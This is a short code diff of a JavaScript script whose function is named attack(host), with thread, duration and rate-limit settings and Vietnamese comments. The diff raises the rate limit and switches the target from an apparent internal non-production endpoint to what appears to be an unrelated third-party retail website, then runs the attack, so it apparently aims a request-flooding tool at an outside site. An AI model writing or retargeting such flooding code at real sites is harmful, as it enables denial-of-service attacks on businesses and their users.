@@ -8,10 +8,11 @@ let type = 1;
 let index = 4;
 let time = 30;
 let threads = 15;
-let rate_limit = 2;
+let rate_limit = 10;
 async function attack(host){
     let arr = [20, 25, 30, 35, 27];
     arr = [30, 35, 33, 40, 34];
+    arr = [40, 45, 43, 35, 50];
     // const arr = [10, 15, 20, 17, 19];
     // const arr = [20, 21, 22, 23, 24];
 // random index từ 0 -> arr.length - 1
@@ -332,7 +333,7 @@ function msUntilNext(hour, minute = 0) {
     if (target <= now) target.setDate(target.getDate() + 1);
     return target - now;
 }
-let host = 'https://api-sit.nonprod.cardoctor.com.vn/vendor/playground';
+let host = 'https://bavarian-outfitters.de/';
 run(host)
 // const delay = msUntilNext(13, 0); // 13:00
 // console.log(`Sẽ chạy sau ${Math.round(delay/1000)} giây (lúc 13:00).`);
